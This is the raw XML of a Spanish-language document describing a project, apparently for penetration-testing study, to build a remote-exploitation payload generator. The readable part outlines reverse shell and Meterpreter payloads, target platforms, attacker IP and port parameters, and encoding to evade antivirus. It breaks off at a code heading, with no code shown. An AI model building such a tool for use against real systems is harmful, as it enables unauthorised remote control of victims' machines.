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style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13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text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13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style:font-name="Arial" fo:font-size="13pt" officeooo:paragraph-rsid="00290f5a" style:font-size-asian="13pt" style:font-size-complex="13pt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>
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L31">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L55">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L58">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L60">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" officeooo:paragraph-rsid="00290f5a" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L65">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" officeooo:paragraph-rsid="00290f5a" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style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2"/>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L33"/>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L34"/>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L35"/>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L36"/>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L37"/>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L38"/>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L39"/>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L40"/>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L41"/>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L42"/>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L43"/>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L44"/>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L45"/>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L46"/>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L47"/>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L48"/>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L49"/>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L50"/>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L51"/>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L52"/>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L53"/>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L54"/>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L55"/>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L56"/>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L57"/>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L58"/>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L59"/>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L60"/>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L60">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L61"/>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L62"/>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L63"/>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L64"/>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L65">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L66">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L67">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L68">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P87" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P88" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L7">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P91" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L12">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L14">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P93" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L16">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P94" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L20">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P95" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9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96" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3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97" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4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98" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L25">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P99" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L26">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P100" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L27">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P101" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L28">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P102" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L29">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P103" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L30">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P104" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L31">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P105" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L32">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P106" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L33">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P107" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L34">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P108" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L35">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P109" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L36">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P110" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L37">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P111" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L38">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P112" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L42">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P113" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L43">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P114" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L44">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P115" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L45">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P116" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L46">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P117" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L47">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P118" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L48">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P119" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L49">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P120" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L50">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P121" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L51">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P122" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L57">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P123" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L58">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P124" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L60">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P125" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L60">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P126" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L61">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P127" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L65">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P128" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P129" style:family="paragraph" style:parent-style-name="Horizontal_20_Line">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P130" style:family="paragraph" style:parent-style-name="Horizontal_20_Line">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" officeooo:paragraph-rsid="00290f5a" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P131" style:family="paragraph" style:parent-style-name="Horizontal_20_Line">
      <style:text-properties style:font-name="Arial" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="P132" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" officeooo:paragraph-rsid="00290f5a" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P133" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P134" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L7"/>
    <style:style style:name="P135" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P136" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L55">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P137" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" officeooo:paragraph-rsid="00290f5a" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P138" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L66">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" officeooo:paragraph-rsid="00290f5a" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P139" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L67">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" officeooo:paragraph-rsid="00290f5a" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="P140" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L55"/>
    <style:style style:name="P141" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L62"/>
    <style:style style:name="P142" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L63"/>
    <style:style style:name="P143" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L66">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P144" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L67">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P145" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P146" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P147" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L7">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P148" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L8">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P149" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L54">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P150" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L55">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P151" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L56">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P152" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L57">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P153" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L62">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P154" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L63">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P155" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L66">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P156" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L67">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="00290f5a"/>
    </style:style>
    <style:style style:name="P157" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" loext:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="00290f5a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Arial"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="13pt" style:font-size-asian="13pt" style:font-size-complex="13pt"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties style:font-name="Arial"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2" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T3">78: Generador de Payloads para Explotación Remota</text:span></text:span></text:h>
      <text:h text:style-name="P128" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Objetivo del Proyecto</text:span></text:span><text:span text:style-name="T2">:</text:span></text:h>
      <text:p text:style-name="P81"><text:span text:style-name="T2">El objetivo de este proyecto es crear un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">generador de payloads</text:span></text:span><text:span text:style-name="T2"> que pueda ser utilizado para </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">explotación remota</text:span></text:span><text:span text:style-name="T2">. Esto implica el desarrollo de una herramienta que pueda generar payloads personalizados, como un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">reverse shell</text:span></text:span><text:span text:style-name="T2"> o </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">meterpreter</text:span></text:span><text:span text:style-name="T2"> en diversos lenguajes y plataformas, para poder establecer una conexión remota con la máquina víctima y tomar el control de la misma de manera ética durante pruebas de penetración.</text:span></text:p>
      <text:p text:style-name="P81"><text:span text:style-name="T2">Este tipo de generador será útil en </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">pruebas de penetración</text:span></text:span><text:span text:style-name="T2"> y en situaciones de </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">evaluación de seguridad</text:span></text:span><text:span text:style-name="T2"> donde se debe comprobar la efectividad de un sistema contra intentos de </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">acceso remoto no autorizado</text:span></text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P130"/>
      <text:h text:style-name="P133" text:outline-level="3"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Pasos para Desarrollar la Herramienta</text:span></text:span><text:span text:style-name="T2">:</text:span></text:h>
      <text:h text:style-name="P128" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">1. Comprensión de los Payloads de Explotación Remota</text:span></text:span></text:h>
      <text:list xml:id="list892944244" text:style-name="L60">
        <text:list-item>
          <text:p text:style-name="P72"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Payloads de Explotación Remota</text:span></text:span><text:span text:style-name="T2">: Un payload de explotación remota es un código malicioso diseñado para ejecutarse en la máquina víctima y </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">establecer una conexión inversa</text:span></text:span><text:span text:style-name="T2"> con la máquina atacante. Estos payloads pueden ser utilizados para ejecutar comandos de forma remota o mantener una sesión persistente en el dispositivo víctima.</text:span></text:p>
          <text:p text:style-name="P20">Los tipos más comunes de payloads incluyen:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P125"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Reverse Shell</text:span></text:span><text:span text:style-name="T2">: Abre una shell inversa desde la víctima hacia la máquina atacante. </text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P72"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Meterpreter</text:span></text:span><text:span text:style-name="T2">: Un payload avanzado utilizado por Metasploit que proporciona una interfaz interactiva con la máquina víctima. </text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P128" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">2. Diseño del Generador de Payloads</text:span></text:span></text:h>
      <text:list xml:id="list1872281990" text:style-name="L65">
        <text:list-item>
          <text:p text:style-name="P77"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Lenguajes y Plataformas Soportados</text:span></text:span><text:span text:style-name="T2">: El generador debe ser capaz de crear payloads para diferentes plataformas, como:</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P127"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Windows</text:span></text:span><text:span text:style-name="T2">: Archivos ejecutables (.exe). </text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P127"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Linux</text:span></text:span><text:span text:style-name="T2">: Archivos binarios (.bin). </text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P127"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">MacOS</text:span></text:span><text:span text:style-name="T2">: Archivos binarios. </text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P127"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Android</text:span></text:span><text:span text:style-name="T2">: Archivos APK. </text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P77"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Python</text:span></text:span><text:span text:style-name="T2">: Scripts ejecutables en Python. </text:span></text:p>
            </text:list-item>
          </text:list>
          <text:p text:style-name="P21">Además, el generador debe permitir la personalización de parámetros clave como:</text:p>
          <text:list text:continue-numbering="true">
            <text:list-item>
              <text:p text:style-name="P127"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">LHOST</text:span></text:span><text:span text:style-name="T2">: Dirección IP de la máquina atacante. </text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P127"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">LPORT</text:span></text:span><text:span text:style-name="T2">: Puerto a través del cual se establecerá la conexión. </text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P127"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Tipo de Payload</text:span></text:span><text:span text:style-name="T2">: Reverse Shell, Meterpreter, etc. </text:span></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P77"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Codificación</text:span></text:span><text:span text:style-name="T2">: Permitir que el payload sea codificado para evitar la detección de antivirus. </text:span></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P128" text:outline-level="4"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">3. Implementación del Generador</text:span></text:span></text:h>
      <text:p text:style-name="P81"><text:span text:style-name="T2">El generador puede ser implementado en Python. A continuación, se detallan los pasos básicos para la creación de un </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">reverse shell</text:span></text:span><text:span text:style-name="T2"> utilizando Python y cómo permitir la personalización para diversos entornos.</text:span></text:p>
      <text:p text:style-name="P81"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Código Base: Generador de Reverse Shell en Python</text:span></text:span></text:p>
